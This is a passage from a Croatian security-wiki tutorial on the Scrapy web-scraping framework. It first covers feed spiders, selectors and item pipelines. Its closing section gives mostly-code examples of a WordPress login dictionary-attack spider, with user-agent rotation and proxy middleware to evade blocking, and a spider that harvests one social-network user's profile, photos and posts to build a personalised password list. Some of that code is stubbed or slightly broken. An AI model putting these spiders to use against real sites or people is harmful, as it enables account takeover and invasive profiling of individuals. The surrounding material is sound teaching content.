</li><li> <code>parse_node(response, selector)</code>: poziva se za svaki čvor iste oznake definirane u <code>itertag</code> atributu. Svaki <i>XMLFeedSpider</i> mora definirati ovu metodu. Vraća <a href="Scrapy_python_framework.html#Items">Item</a>, Request ili oboje.
</li><li> <code>process_results(response, results)</code>: kao argument prima listu rezultata (<a href="Scrapy_python_framework.html#Items">Item</a> ili Request objekti) a koristi se za završno procesuiranje. Vraća listu rezultata(<a href="Scrapy_python_framework.html#Items">Item</a> ili Request)
</li></ul>
<h5> <span class="mw-headline" id="Primjer_3"> Primjer </span></h5>
<p>U ovom primjeru dohvaćamo nazive gradova sa stranice posta.hr na kojoj se nalaze popisi svih poštanskih ureda u XML datoteci.
<code>
</p>
<pre>from scrapy.contrib.spiders import XMLFeedSpider
from gradovi.items import GradoviItem

class PostaGradoviSpider(XMLFeedSpider):
   name = 'posta_gradovi'
   allowed_domains = ['posta.hr']
   start_urls = ['http://www.posta.hr/mjestaRh.aspx?vrsta=xml']
   iterator = 'iternodes'
   itertag = 'mjesto'

   def parse_node(self, response, selector):
       i = GradoviItem()
       i['ime'] = selector.select('nazivPu').xpath('text()').extract().pop()
       return i
</pre>
<p></code>
Kako bi ignorirali duplikate u datoteci <code>pipelines.py</code> (automatski se kreira s projektom) definiramo novi <a href="Scrapy_python_framework.html#Item_Pipeline">Item Pipeline</a> pod nazivom <code>GradoviPipeline</code>:
<code>
</p>
<pre>from scrapy.exceptions import DropItem

class GradoviPipeline(object):
       def __init__(self):
               self.locations_seen = set()

       def process_item(self, item, spider):
               if item['ime'] in self.locations_seen:
                       raise DropItem("Duplicate location found:&#160;%s"&#160;% item['ime'])
               else:
                       self.locations_seen.add(item['ime'])
                       return item
</pre>
<p></code>
</p>
<h4> <span class="mw-headline" id="CSVFeedSpider"> CSVFeedSpider </span></h4>
<p>Sličan <i>XMLFeedSpideru</i>, samo što iterira kroz redove, a ne čvorove.
</p><p><b>Atributi</b>:
</p>
<ul><li> <code>delimiter</code>: string; definira separator (<code>default = ','</code>)
</li><li> <code>headers</code>: lista naziva polja CSV datoteteke
</li></ul>
<p><b>Metode</b>:
</p>
<ul><li> <code>parse_row(response, row)</code>: Kao argument prima Response objekt i <code>dict</code> koji prezentira redak.
</li><li> <code> adapt_response(response) </code>
</li><li> <code> process_results(response, results) </code>
</li></ul>
<h4> <span class="mw-headline" id="SitemapSpider"> SitemapSpider </span></h4>
<p>Koristi se za obradu stranica otkrivanjem URL-ova koristeći mapu Web mjesta. Podržava ugniježđene mape i otkrivanje URL-ova mape iz <i>robots.txt</i> datoteke.
</p><p><b>Atributi</b>:
</p>
<ul><li> <code>sitemaps_urls</code>: lista URL-ova mapa Web mjesta
</li><li> <code>sitemap_rules</code>: lista <code>[(regex, callback), …]</code>; <code>regex</code> je regularni izraz korišten kako bi izdvojili određene URL-ove iz mape Web mjesta, a <code>callback</code> funkcija se poziva kako bi se isti obradili
</li><li> <code>sitemap_follow</code>: lista regularnih izraza koji definiraju URL-ove koje želimo pratiti
</li><li> <code>sitemap_alternate_links</code>: definira želimo li pratiti alternative linkove istog sadržaja. Obično su to linkovi na drugom jeziku.
</li></ul>
<h2> <span class="mw-headline" id="Selectors"> Selectors </span></h2>
<p>Nativni mehanizam za izvlačenje podataka, kreiran na temelju <a href="http://lxml.de/" class="external text" rel="nofollow">lxml biblioteke</a>. 
<code>
</p>
<pre>$ scrapy shell http://www.en.wikipedia.org/wiki/Scrapy
  ...
  2015-01-17 04:57:11-0500 [default] DEBUG: Crawled (200) &lt;GET <a href="http://en.wikipedia.org/wiki/Scrapy" class="external free" rel="nofollow">http://en.wikipedia.org/wiki/Scrapy</a>&gt; (referer: None)
  ... 
  In [1]: response.selector.xpath(&quot;//div[@id='bodyContent']&quot;)
  Out[1]: [&lt;Selector xpath=&quot;//div[@id='bodyContent']&quot; data=u'&lt;div id=&quot;bodyContent&quot; class=&quot;mw-body-con'&gt;]
 
</pre>
<p></code>
</p><p>Metode koje smo već u prethodnim primjerima demonstrirali, <code>xpath()</code>, <code>css()</code>, <code>re()</code> i <code>execute()</code>, dio su Selector klase. Da ponovimo, <code>xpath()</code> vraća SelectorList instancu na temelju proslijeđenog upita dok <code>css()</code> vraća isto na temelju CSS upita. Pomoću <code>re()</code> metode koja za upit prima regularni izraz (eng. regular expression) filtriramo listu. <code>extract()</code> vraća listu <i>unicode stringova</i>.
Iako se preporuča, ne moramo koristiti selector prečac:
<code>
</p>
<pre>In [2]: response.xpath(&quot;//div[@id='bodyContent']&quot;)
Out[2]: [&lt;Selector xpath=&quot;//div[@id='bodyContent']&quot; data=u'&lt;div id=&quot;bodyContent&quot; class=&quot;mw-body-con'&gt;]

In [3]: response.xpath(&quot;//div[@id='bodyContent']&quot;).extract()
Out[3]: [u'&lt;!--- HTML CONTENT ---&gt;']
</pre>
<p></code>
</p>
<h3> <span class="mw-headline" id="SelectorList"> SelectorList </span></h3>
<p>Podklasa <code>list</code> klase. Elementi liste su Selector objekti. Također sadrži <code>xpath()</code>, <code>css()</code>, <code>re()</code>, <code>extract()</code> metode koje se pozivaju za svaki element liste. Metode vraćaju SelectorList odnosno u slučaju <code>re()</code> i <code>extract()</code> metode, listu <i>unicode stringova</i>.
</p>
<h2> <span class="mw-headline" id="Items"> Items </span></h2>
<p>Glavni cilj Scrapy Python razvojnog okvira je keriranje strukturiranih podatak za što koristimo Item klasu u <code>items.py</code> datoteci koja se automatski kreira prilikom postavljanja projekta. Unutar te klase definiramo atribute kao <code>Field</code> objekte koji su zapravo ništa drugo nego Python <code>dictionary</code>. <br /> 
Za demonstraciju koristi ćemo Item definira u uvodnom primjeru:
<code>
</p>
<pre>import scrapy
class SfMovieItem(scrapy.Item):
       title = scrapy.Field()
       year = scrapy.Field()
       rating = scrapy.Field()
</pre>
<p></code>
<code>
</p>
<pre>$ scrapy shell
  ...
  In [1]: from  sf_movies_cat.items import SfMovieItem
  In [2]: item = SfMovieItem(title='Naslov', year='2020')
  In [3]: print item
  {'title': 'Naslov', 'year': '2020'}
  In [4]: item['title']
  Out[4]: 'Naslov'
  In [5]: item.get('title')
  Out[5]: 'Naslov'
  In [6]: item.items()
  Out[6]: [('year', '2020'), ('title', 'Naslov')]
  In [7]: item.fields
  Out[7]: {'rating': {}, 'title': {}, 'year': {}}
  In [8]: item['rating'] = 8.9
  In [9]: item.items()
  Out[9]: [('rating', 8.9), ('year', '2020'), ('title', 'Naslov')]
</pre>
<p></code>
</p>
<h3> <span class="mw-headline" id="Item_Pipeline"> Item Pipeline </span></h3>
<p>Svaki <code>Item</code> proslijeđuje se <i>Item Pipeline</i> dijelu Scrapy razvojnog okvira, nakon obrade od strane <i>spidera</i>.
<i>Item Pipeline</i> predstavljen je klasom koja implementira nekoliko metoda: <code>process_item()</code> - poziva se za svaki proslijeđeni <i>item</i>, <code>open_spider()</code> i <code>close_spider()</code>, metode koje se pozivaju prilikom pokretanja i kraja rada <i>spidera</i>.
<i>Item Pipeline</i> se koristi uglavnom za čićenje HTML-a, validaciju podataka te provjeru duplikata kao što je prikazano u <a href="Scrapy_python_framework.html#Primjer_3">primjeru</a>.
</p>
<h2> <span class="mw-headline" id="Ostalo"> Ostalo </span></h2>
<h3> <span class="mw-headline" id="Dictionary_attack"> Dictionary attack </span></h3>
<p>Scrapy možemo koristi za razne stvari, pored vađenja podataka, indeksiranja, možemo ga iskoristi i za <i>dictionary attack</i>. Slijedeći primjer pokazuje kako iskoristiti Scrapy za napad na stranicu koja koristi WordPress CMS:
</p><p><code>
</p>
<pre>class WpAtckSpider(scrapy.Spider):
       name = "wp_atck"
   	download_delay = 2 # atribut Spider klase, definira razmak između poziva u sekundama
	user = ""
	curr_pwd = ""
       pwd_perms = []
	it = None
	dict = []
		
	def __init__(self, file=None, *args, **kwargs):
		super(IskraSpider, self).__init__(*args, **kwargs)
		#citanje i pohrana potencijalnih lozinki u dict

	def form_req(self):
		return [FormRequest(url='http://site.com/wp-login.php', formdata={"log":self.user, 
                           "pwd":self.curr_pwd }, method="POST", dont_filter=True, callback=self.parse)]

 	def start_requests(self):
		return self.form_req()
       
       def set_pwd_perms(self, new_pwd):
               # zamijene znakova, dodavanje sufiksa, prefiksa (brojevi, posebni znakovi)
               # vraća listu lozinki kreiranih na temelju new_pwd
       
  	def parse(self, response):
		if "/wp-admin/profile.php" in response.url:
			log.msg("WIN:&#160;%s"&#160;%(self.curr_pwd), level = log.INFO)

		else:
                        if len(self.pwd_perms) == 0:
                               self.pwd_perms = set_pwd_perms(self.it.next())
                        self.curr_pwd = self.pwd_perms.pop()
			log.msg("Failed with&#160;%s"&#160;%(self.curr_pwd), level = log.INFO)
			return self.form_req()
</pre>
<p></code>
</p><p>Također smo u mogućnosti mijenjati vrijednosti polja HTTP zaglavlja kao što je npr. <i>User Agent</i> ali i koristit <i>proxy</i> što je za ovaj primjer prikladno. U korijenskom direktoriju kreiramo novu datoteku <code>middleware.py</code>:
<code>
</p>
<pre>class RandomUAMiddleware(object):
	def process_request(self, request, spider):
		ua = random.choice(settings.get('USER_AGENT_LIST'))
		if ua:
			request.headers.setdefault('User-Agent', ua)

class ProxyMiddleware(object):
	def process_request(self, request, spider):
		request.meta['proxy'] = 'http://proxy_prv.com:PORT'
		proxy_up = 'USER:PASS'
		encoded_up = base64.encodestring(proxy_up)
		request.headers['Proxy-Authorization'] = 'Basic ' + encoded_up
</pre>
<p></code>
</p><p>Kreirane klase moramo prijaviti Scrapy razvojnom okviru u <code>settings.py</code> datoteci te kreirati listu iz kojeg se dohvaćaju <i>User Agent stringovi</i> u klasi <code>RandomUAMiddleware</code>:
<code>
</p>
<pre>USER_AGENT_LIST = [
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.7 (KHTML, like Gecko) Chrome/16.0.912.36 Safari/535.7',
'Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0) Gecko/16.0 Firefox/16.0',
 ...
]
DOWNLOADER_MIDDLEWARES = {
'wp_dic_atck.middlewares.RandomUAMiddleware': 400,
'wp_dic_atck.middlewares.ProxyMiddleware': 500,
'scrapy.contrib.downloadermiddleware.httpproxy.HttpProxyMiddleware': 600,
'scrapy.contrib.downloadermiddleware.useragent.UserAgentMiddleware': None,
} 
</pre>
<p></code>
</p>
<h3> <span class="mw-headline" id="Dictionary_scraper"> Dictionary scraper </span></h3>
<p>Sljedeći primjer kreira listu često korištenih riječi od strane definiranog korisnika jedne društvene mreže. <i>Spider</i> prolazi kroz profil korisnika te vadi bitne podatke. Kreirana lista može se koristiti u prethodnom primjeru (<a href="http://www.pcadvisor.co.uk/news/security/3254182/79-of-web-users-put-personal-info-in-passwords/" class="external text" rel="nofollow">79% web korisnika</a> uključuje osobne podatke u lozinkama) uz listu najkorištenijih riječi u lozinkama.
<code>
</p>
<pre>class DictSpiderSpider(scrapy.Spider):
	name = "dict_spider"
	site = '<a href="https://site.com'" class="external free" rel="nofollow">https://site.com'</a>
	start_urls = [site + '/login.php']
	
 	email = "" 
	password = ""  # kao i email, koristi se ako se zelimo prijaviti kao korisnik mreze
	user=""  # naziv korisnika cije podatke vadimo
	filename = "dict.txt"
	min_occur = 2  # minimalni br potrebnog pojavljivanja da bi rijec ukljucili u listu
	min_length = 4  # minimalno duzina rijeci koje zelimo 
	
	dict = []
	curr_post_id = 3

	def spider_closed(self, spider):
               # poziva se prilikom zavrsetka rada spidera
               # filtira dict po min_occur atributu te ga ispisuje u txt datoteku
	

	
       def parse(self, response):
		 if len(self.email) &gt; 0 and len(self.password) &gt; 0:
			return [scrapy.FormRequest.from_response(response, formname="login_form", formdata={'email':self.email,   
                               'pass':self.password}, callback=self.after_login)]
		 elif len(self.user) &gt; 0:
			return [scrapy.Request(url= self.site + '/' + self.user + '?v=info', callback=self.get_basic_data)]
			 
	

       # vadi osnovne podatke o korisniku
       # na kraju vraca request s callback funkcijom 
       # za skeniranje fotografija(opisa) te postova 
	def get_basic_data(self, response):
		ns = response.xpath("//div[@id='root']/div/div[1]//strong/text()").extract()
		...	
		nn = response.xpath("//div[@id='root']/div/div[@id='nicknames']//table//td[2]//text()").extract()
		
		self.extract_common(ns)
		...
		self.extract_common(nn)
           
		bio = response.xpath("//div[@id='root']/div/div[@id='bio']/div/div[2]/div/text()").extract()
		qs = response.xpath("//div[@id='root']/div/div[@id='quote']/div/div[2]/div/text()").extract()
		
		self.extract_keywords(self.sel_to_str(bio))
		self.extract_keywords(self.sel_to_str(qs))
		
		yield scrapy.Request(url= self.site + '/' + self.user + '?v=photos', callback=self.set_pics_crawl)
		yield scrapy.Request(url= self.site + '/' + self.user + '?v=timeline', callback=self.set_posts_crawl)
	

 
       def extract_common(self, sel):
		# iterira kroz proslijeđeni selector objekt
               # rastavlja rijeci, filtrira i proslijedjuje ih word_to_dict(word, True) metodi



        # koristi Alchemy API za vadjenje kljucnih rijeci iz vece kolicine teksta
        # u slucaju da to nije moguce, jednostavno rastavlja tekst na rijeci

	def extract_keywords(self, text):
		alchemyapi = AlchemyAPI()
		response = alchemyapi.keywords("text", text)
		
		if response["status"] == "OK" and "keywords" in response:
			for keyword in response["keywords"]:
				txt = keyword["text"].encode("utf-8").split(" ")
				for i in txt:
					self.word_to_dict(i)
		else:
			text = text.encode("utf-8").split(" ")
			for t in text:
				self.word_to_dict(t)



	# u slucaju da rijec (npr. ime, prezime, imena clanova obitelji,...) 
        # ima max prioritet dodajemo joj najvecu vrijednost pojavljivanja
        # te time osiguravamo da nece biti ignorirana pri upisu u txt datoteku
  
	def word_to_dict(self, word, max_prior = False):
		word = self.filter(word)
		if len(word) &gt; self.min_length or max_prior == True:
			word_found = False
			for row in self.dict:				
				if row[0] == word:
					word_found = True
					if row[1]&#160;!= sys.maxint:
						row[1] += 1
					break
			if word_found == False:
				if max_prior == False:
					self.dict.append([word, 1])
				else: 
					self.dict.append([word, sys.maxint])
</pre>
<p></code>
</p><p>Metode za obradu albuma korisnika: 
<code>
</p>
<pre>	def set_pics_crawl(self, response):
		link_all_albums = response.xpath("//h3[contains(text(),'Albums')]/following-sibling::div[2]/a/@href").extract()
		
		if len(link_all_albums) &gt; 0: #u slucaju da postoji vise od 6 albuma
			link = link_all_albums.pop()
			yield scrapy.Request(url= self.site + link, callback=self.get_album_pages)
		else:
			albums_links = response.xpath("//h3[contains(text(),'Albums')]/following-sibling::div[1]//a/@href").extract()
			for link in albums_links:
             			yield scrapy.Request(url= self.site + link, callback=self.get_album_pics)




       # poziva se u slucaju da postoje liste albuma
	
	def get_album_pages(self, response):
               # izvlaci linkove albuma
	        # iterira kroz stranice s linkovima albuma		
	
	
 	
	def get_album_pics(self, response):
		pic_links = response.xpath("//div[@id='root']/table//div[@id='thumbnail_area']//a/@href").extract()
		# iz stranice albuma vadi linkove fotografija
                for link in pic_links: 
			yield scrapy.Request(url= self.site + link, callback=self.get_pic_data) #vadi podatke iz opisa te ih obradjuje
		
                # ako je album veci od x fotografija poziva drugi dio albuma
		more_link = response.xpath("//div[@id='root']//div[@id='m_more_item']/a/@href").extract()
		if len(more_link) &gt; 0:
			link = more_link.pop()
			yield scrapy.Request(url= self.site + link, callback=self.get_album_pics)
 

</pre>
<p></code>
</p><p><br />
Metode za obradu postova korisnika:
<code>
</p>
<pre>       def set_posts_crawl(self, response):	
		if "?v=timeline" in response.url:
			next_y_link = response.xpath("//div[@id='structured_composer_async_container']/div[" + str(self.curr_post_id) +  
                                                    "]/a/@href").extract().pop().encode("utf-8")		
			yield scrapy.Request(url= self.site + next_y_link, callback=self.posts_iterator)
		
	
	
	def posts_iterator(self, response):
		post_links = response.xpath("//div[@id='structured_composer_async_container']/div[1]/div[2]/div/div//a[contains(text(), 'Full  
                                            Story')]/@href").extract()
		for link in post_links:
			if "photo.php" not in link: #to smo vec obradili
				yield scrapy.Request(url= self.site + link, callback=self.get_post_data) #metoda za obradu postova
		
		next_data = response.xpath("//div[@id='structured_composer_async_container']/div[2]/a")
		next_txt = next_data.xpath("text()").extract().pop().encode("utf-8")
		next_link = next_data.xpath("@href").extract().pop().encode("utf-8")
		
		
		if next_txt == "Show more":
			yield scrapy.Request(url= self.site + next_link, callback=self.posts_iterator)
	
		elif next_txt&#160;!= "Born":
			self.curr_post_id += 1
			
			next_y_link = response.xpath("//div[@id='structured_composer_async_container']/div[" + str(self.curr_post_id) + 
                                                    "]/a/@href").extract().pop().encode("utf-8")		
			yield scrapy.Request(url= self.site + next_y_link, callback=self.posts_iterator)
		

</pre>
<p></code>
</p>
<h2> <span class="mw-headline" id="Literatura"> Literatura </span></h2>
<p>Scrapy Documentation, release 0.24.0. Dostupno na: <a href="https://media.readthedocs.org/pdf/scrapy/0.24/scrapy.pdf" class="external free" rel="nofollow">https://media.readthedocs.org/pdf/scrapy/0.24/scrapy.pdf</a>, 23.01.2015.
</p>
<!-- 
NewPP limit report
Preprocessor node count: 313/1000000
Post-expand include size: 0/2097152 bytes
Template argument size: 0/2097152 bytes
Expensive parser function count: 0/100
-->

<!-- Saved in parser cache with key sisds:pcache:idhash:7918-0!*!0!!hr!*!edit=0 and timestamp 20190203204247 -->
<div class="printfooter">
Dobavljeno iz "<a href="Scrapy_python_framework.html">http://security.foi.hr/wiki/index.php/Scrapy_python_framework</a>"</div>
				<!-- /bodytext -->
								<!-- catlinks -->
				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
												<div class="visualClear"></div>
			</div>
			<!-- /bodyContent -->
		</div>
		<!-- /content -->
		<!-- header -->
		<div id="mw-head" class="noprint">
			
<!-- 0 -->
<div id="p-personal" class="">
	<h5>Osobni alati</h5>
	<ul>
					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=Scrapy_python_framework" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
			</ul>
</div>

<!-- /0 -->
			<div id="left-navigation">
				
<!-- 0 -->
<div id="p-namespaces" class="vectorTabs">
	<h5>Imenski prostori</h5>
	<ul>
					<li  id="ca-nstab-main" class="selected"><span><a href="Scrapy_python_framework.html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
					<li  id="ca-talk" class="new"><span><a href="http://security.foi.hr/wiki/index.php?title=Razgovor:Scrapy_python_framework&amp;action=edit&amp;redlink=1"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
			</ul>
</div>

<!-- /0 -->

<!-- 1 -->
<div id="p-variants" class="vectorMenu emptyPortlet">
		<h5><span>Inačice</span><a href="Scrapy_python_framework.html#"></a></h5>
	<div class="menu">
		<ul>
					</ul>
	</div>
</div>

<!-- /1 -->
			</div>
			<div id="right-navigation">
				
<!-- 0 -->
<div id="p-views" class="vectorTabs">
	<h5>Pogledi</h5>
	<ul>
					<li id="ca-view" class="selected"><span><a href="Scrapy_python_framework.html" >Čitaj</a></span></li>
					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=Scrapy_python_framework&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=Scrapy_python_framework&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
			</ul>
</div>

<!-- /0 -->

<!-- 1 -->
<div id="p-cactions" class="vectorMenu emptyPortlet">
	<h5><span>Radnje</span><a href="Scrapy_python_framework.html#"></a></h5>
	<div class="menu">
		<ul>
					</ul>
	</div>
</div>

<!-- /1 -->

<!-- 2 -->
<div id="p-search">
	<h5><label for="searchInput">Traži</label></h5>
	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
		<input type='hidden' name="title" value="Posebno:Traži"/>
				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
			</form>
</div>

<!-- /2 -->
			</div>
		</div>
		<!-- /header -->
		<!-- panel -->
			<div id="mw-panel" class="noprint">
				<!-- logo -->
					<div id="p-logo"><a style="background-image: url(../../images/osslogo.png);" href="../../wiki.html"  title="Glavna stranica"></a></div>
				<!-- /logo -->
				
<!-- navigation -->
<div class="portal" id='p-navigation'>
	<h5>Orijentacija</h5>
	<div class="body">
				<ul>
					<li id="n-mainpage-description"><a href="../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
					<li id="n-recentchanges"><a href="./Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
					<li id="n-randompage"><a href="./Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
					<li id="n-help"><a href="./Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
				</ul>
			</div>
</div>

<!-- /navigation -->

<!-- SEARCH -->

<!-- /SEARCH -->

<!-- TOOLBOX -->
<div class="portal" id="p-tb">
	<h5>Traka s alatima</h5>
	<div class="body">
		<ul>
					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/Scrapy_python_framework" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/Scrapy_python_framework" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
																																										<li id="t-specialpages"><a href="./Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=Scrapy_python_framework&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=Scrapy_python_framework&amp;oldid=33736" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
						</ul>
	</div>
</div>

<!-- /TOOLBOX -->

<!-- LANGUAGES -->

<!-- /LANGUAGES -->
			</div>
		<!-- /panel -->
		<!-- footer -->
		<div id="footer">
											<ul id="footer-info">
																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 17:49, 23. siječnja 2015.</li>
																							<li id="footer-info-viewcount">Ova stranica je pogledana 6.288 puta.</li>
																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
															</ul>
															<ul id="footer-places">
																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
																							<li id="footer-places-about"><a href="./SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
															</ul>
											<ul id="footer-icons" class="noprint">
					<li id="footer-copyrightico">
						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
					</li>
					<li id="footer-poweredbyico">
						<a href="http://www.mediawiki.org/"><img src="../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
					</li>
				</ul>
						<div style="clear:both"></div>
		</div>
		<!-- /footer -->
		
<script src="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
<script>if ( window.mediaWiki ) {
	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Scrapy_python_framework", "wgTitle": "Scrapy python framework", "wgAction": "view", "wgArticleId": 7918, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 33736, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
}
</script>
<script>if ( window.mediaWiki ) {
	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
	mediaWiki.loader.go();
}
</script>

<script>if ( window.mediaWiki ) {
	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
}
</script>		<!-- fixalpha -->
		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
		<!-- /fixalpha -->
		<!-- Served in 0.580 secs. -->			</body>
</html>
